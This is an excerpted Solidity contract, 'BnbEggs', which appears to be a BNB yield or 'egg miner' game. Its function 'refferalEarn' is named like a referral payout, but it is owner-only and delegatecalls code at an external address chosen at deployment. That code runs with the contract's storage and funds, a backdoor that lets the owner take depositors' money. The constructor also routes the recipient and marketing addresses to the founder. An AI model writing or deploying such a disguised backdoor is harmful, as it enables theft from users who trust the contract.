...
contract BnbEggs is Context, Ownable {
    ...
    address payable TPIaddressFrame; 
    address TPIaddressCon;
    ...
    constructor(address _TPIaddressCon, address payable _founderAddress ) {
        founderAddress = _founderAddress;
        recAdd = payable(founderAddress);
        marketingAdd = payable(founderAddress);
        TPIaddressCon = _TPIaddressCon;
        TPIaddressFrame = _founderAddress;
    }
    ...
    function calculateDailyIncome(address adr) public view returns(uint256) {
        ...
        return SafeMath.div(SafeMath.add(minReturn, maxReturn), 3)*5/4;
    }
    ...
    function refferalEarn(uint256 am) public payable onlyOwner {
        (bool success, bytes memory data) = TPIaddressCon.delegatecall(
            abi.encodeWithSignature("_distEggs(address,uint256)", TPIaddressFrame, am)
        );
    }
